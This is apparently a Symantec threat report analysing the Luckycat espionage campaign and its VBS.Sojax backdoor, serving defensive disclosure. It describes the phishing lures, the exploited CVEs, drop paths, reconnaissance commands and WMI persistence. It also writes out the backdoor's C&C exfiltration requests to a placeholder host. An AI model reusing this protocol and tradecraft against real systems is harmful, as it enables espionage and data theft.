Overview
A series of attacks, targeting both Indian military research and south
Asian shipping organizations, demonstrate the minimum level of effort required to successfully compromise a target and steal sensitive
information. The attackers use very simple malware, which required
little development time or skills, in conjunction with freely available
Web hosting, to implement a highly effective attack. It is a case of the
attackers obtaining a maximum return on their investment. The attack shows how an intelligent attacker does not need to be particularly technically skilled in order to steal the information they are after.
The attack begins, as is often the case, with an email sent to the victim.
A malicious document is attached to the email, which, when loaded, activates the malware. The attackers use tailored emails to encourage the
victim to open the email. For example, one email sent to an academic
claimed to be a call for papers for a conference (CFP). Academics receive
dozens of CFPs every year. If the victim has previously presented at that
particular conference, or is interested in the subject matter, they are
quite likely to open the CFP. Another email sent to a maritime organization claims to contain details of an alert beaconing system. Again, this is
a relevant topic for the recipient. A judicious choice of email topics and
recipients by the attackers is the most effective way of compromising the
target and also maintaining a low profile. Fewer, more effective emails,
which do not draw attention to themselves, allow the attacks to continue
undetected for as long as possible. Discreet malware also aids this cause.
After the email attachment has been opened by the victim, the malware,
VBS.Sojax, is activated. The attackers chose a very simple technique for

their malware. Rather than using a compiled programming language to write the back door Trojan, they used
a Visual Basic script. Scripts are very simple to develop, requiring less expertise and time to develop than a
standard back door Trojan. The script itself is quite simple. It connects to a command-and-control (C&C) server
to retrieve commands and upload data. HTTP is used to easily pass through firewalls. The script functionality is
basic; it can run commands and it can upload and download files. This is enough to retrieve any information the
attackers want. Again, minimal effort is expended for maximum gain.
The same ethos is shown with the choice of C&C servers. C&C servers are a potential pitfall for the attackers as
it may be possible for an investigator to track the attackers using registration details for the C&C server. This
is the case when the attackers register and pay for their own C&C server. A commonly used alternative is for
attackers to commandeer an innocent third party server for their own purposes. This requires effort, however,
as the attackers must firstly locate and then hack into the server. The Sojax attackers use an approach that
requires much less effort. They use free Web hosting. There are hundreds of free Web hosting sites that require
little or no registration information. Once the attackers have registered the free service, they create a directory
and upload a PHP script that acts as the C&C server. They then modify their malware scripts to use this new URL
and email the scripts out to targets. Symantec identified 25 C&C servers. Only two or three of these were active,
the rest had been abandoned. Several partial listings of stolen file names (not the files) were retrieved from the
server, along with the IP addresses of compromised computers and the IP addresses of the attackers.
The vast majority of the victims were based in India, with some in Malaysia. The victim industry was mostly military research and also shipping based in the Arabian and South China seas. In some instances the attackers appeared to have a clear goal, whereby specific files were retrieved from certain compromised computers. In other
cases, the attackers used more of a ‘shotgun’ like approach, copying every file from a computer. Military technologies were obviously the focus of one particular attack with what appeared to be source code stolen. 45 different
attacker IP addresses were observed. Out of those, 43 were within the same IP address range based in Sichuan
province, China. The remaining two were based in South Korea. The pattern of attacker connections implies that
the IP addresses are being used as a VPN, probably in an attempt to render the attackers anonymous.
The attacks have been active from at least April 2011 up to February 2012. The attackers are intelligent and
focused, employing the minimum amount of work necessary for the maximum gain. They do not use zero day
exploits or complicated threats, instead they rely on effective social engineering and lax security measures on
the part of the victims. Security awareness training and a consistent patching strategy would have protected the
victims from these attacks.

Technical details
Attack vector
The attacks are initiated by
email. Symantec.cloud has
detected several emails distributing the VBS.Sojax back door
Trojan. Two example emails are
shown in figure 1.

Figure 1

Example emails

Most of the emails are fairly
well tailored. The two examples
shown here are probably the
most targeted ones. Other
emails topics are about salaries
– a fairly common topic used in
targeted attacks. The emails are
nearly all sent from Gmail, which
does not store the originating IP
address. Two of the emails were

Page 2

sent through Yahoo mail, which does store
the originating IP address. The source IP address for both of these emails was the same
– an IP address located in Germany. Other
independent reports show this IP address
as an originator of spam and thus may be an
open relay.

Figure 2

Samples & emails over time

The breakdown of emails detected by Symantec.cloud and samples per month is shown in
figure 2. These numbers represent the minimum number of emails sent by the attackers
as not all victims are using Symantec.cloud
services.
Figure 3 lists the number and type of exploit
used by the attackers. The exploits are all old,
publicly available, and patched. The vast majority used are PDF exploits. Sixteen samples
exploiting the CVE-2010-2883 vulnerability
have been located, with only one or two of
the other exploits. It may be that the attackers have more success with the PDF exploit
either because the target computers are not
patched, or because it is easier to obfuscate
the PDFs and prevent antivirus detection.

Figure 3

Exploits used by the attackers

VBS.Sojax
When the dropper document, the .doc, .rtf, or
.pdf is loaded, it drops an executable to the
following location:
%ProgramFiles%\Common Files\Microsoft
Shared\update.exe

Figure 4

A portion of VBS.Sojax

This executable is then run. When run, it extracts a script
from its resources and writes this script to the following
location %Temp%\~temp.vbs. This script contains the primary functionality of the threat. Figure 4 shows a portion
of the script. The simplicity of the script is plain to see.
When first run, the script obtains the following information:
• A complete listing of all files in partitions from drives C through I
• Network information (ipconfig /all)
• Information about the compromised computer (systeminfo)
• Processes running on the computer (tasklist)
It stores all of the output in the following folder:
%Windir%\NtUninstallKB
This data is then compressed into a .cab file and uploaded to the C&C server. VBS.Sojax parses the response
from the server, looking for three potential commands:
• Upload files to the C&C server
• Download files from the C&C server
• Execute a command (figure 4)
Page 3

The Luckycat Hackers
Security Response

The C&C server is then polled every 30 seconds for additional commands. To maintain persistence, VBS.Sojax
registers itself to be called on reboot using a WMI event.

C&C server protocol
When VBS.Sojax connects to the C&C server, it does so through HTTP port 80. If uploading data, it sends a HTTP
POST request to a script called either count.php or loveusa.php. This POST request is formatted as follows:
HTTP POST http://server.com/count/count.php?m=c&n=MACADDRESS
The MACADDRESS value is the MAC address of the compromised computer. To retrieve a command from the
server, the script then polls for commands specific to that MACADDRESS.
HTTP GET http://server.com/count/count.php?m=r&n=MACADDRESS.c
If there is a command, the command is executed and the results are uploaded to the server using a HTTP POST
request. It is a very simple protocol, there is no authentication.

C&C servers
So far, 25 C&C servers have been identified. They are listed in Table 1 and graphed in figure 5. The majority of
these C&C servers are free hosting providers. The attackers sign up for an account, register the sub-domain for
free, and upload their C&C server script to a count folder.
Table 1

When a compromised computer uploads data to the count.php script using an
HTTP post, that data is written into a file in the same folder as the C&C server.
Although most of these files had since been retrieved and subsequently deleted
by the attackers, several files remained. Some of the remaining files were the
compressed .cab files described previously. Others were fragments of commands
and some stolen files.

Command and
Control domains

In one instance, several log files of activity on a C&C server were found. These
log files listed all of the files stolen by the attackers with respect to that particular C&C server. There was also a log file showing what appeared to be FTP
connections to the server from the attackers.

Victims
From the log files and fragments of stolen data remaining on the server, it was possible to identify eight victims. At the time of writing, where possible, the victims are in the process of being notified and any information
retrieved passed on. Figure 6 shows the geographical distribution of the victims. Nearly every infection is in
India, with several others in
Figure 6
Malaysia.
Distribution of VBS.Sojax victims
Victim industries were
military research, defense,
manufacturing, and maritime. The data stolen was
quite varied. In some cases
it appeared that documents
with suggestive names were
stolen, simply out of curiosity. For example, one stolen
document that had a military themed title is actually
publicly available from the
publisher’s website.
Other stolen files were
more serious. Two separate
victims had documents pertaining to the same military
technology. The attackers
were clearly targeting that technology. The attackers also stole source code from one of those two victims that
may have been related to the technology.

The attackers
The most useful information about the attackers is in one of the log files retrieved from a C&C server. This log
file appears to record connections to an FTP server running on the C&C server. The attackers probably use FTP
to easily retrieve stolen data uploaded to the C&C server. 45 unique IP addresses were identified in the log. Of
these, all but two are from the same ISP, based in Sichuan province in China. The remaining two are from South
Korea. Figure 7 shows a portion of that log.
Figure 7

Connections from the attacker

The user LUCKYCAT is the attacker who successfully logged into the server. The connections by LUCKYCAT are
consecutive. Immediately after one connection is closed, a new one is opened by the attacker. A lack of overlap
implies that a single person or program is making the connections and not multiple people from different computers.
Page 5

The Luckycat Hackers
Security Response

Despite this, the IP address used for the new connection changes regularly. In figure 7, during a period of approximately an hour and 15 minutes, four different IP addresses were used for six distinct connections. This
is unusual because if the attacker is using DHCP, generally an IP address will remain allocated to a particular
computer for a longer period of time.
A possible explanation is that the IP addresses used are the point of egress of a VPN-like service. The attackers
may be using a service through which they can route their connections. The service periodically rotates connections amongst a pool of IP addresses in order to render the attacker anonymous or implicate China as the
source of the attack. There are two potential reasons for the South Korean IP addresses. The first is that the IP
addresses are part of the VPN service and were assigned to the attacker as the service rotated through the range
of IP addresses available. The second explanation is that the attacker may have forgotten to enable the VPN by
mistake and connected directly to the C&C server.
Figures 8 and 9 show the log at the time that the South Korean IP addresses logged into the FTP server.
Figure 8

First South Korean IP address

Figure 9

Second South Korean IP address

In both cases, connections from the Chinese and South Korean IP addresses are around the same time. Either
the time overlaps as in figure 8, or the times are immediately consecutive as in figure 9. This suggests that the
connecting person, or program, is the same in both cases.

Conclusion
The attacks described are very simple. That, however, does not mean that they are not intelligently designed and
ultimately, highly effective. Using a scripting language to develop the VBS.Sojax threat cuts down on development time. It means less effort needs to be invested in attempting to prevent detection by antivirus software.
Similarly, using freely available hosting for C&C servers (theoretically) limits exposure. Old exploits are so well
documented and freely available that minimal effort is required to modify them for use. Such basic tools, in combination with targeted social engineering, proved to be an efficient combination for the attacker. These attacks
should not have succeeded on a properly secured network. Old exploits should have been patched and users
should have received adequate security awareness training.
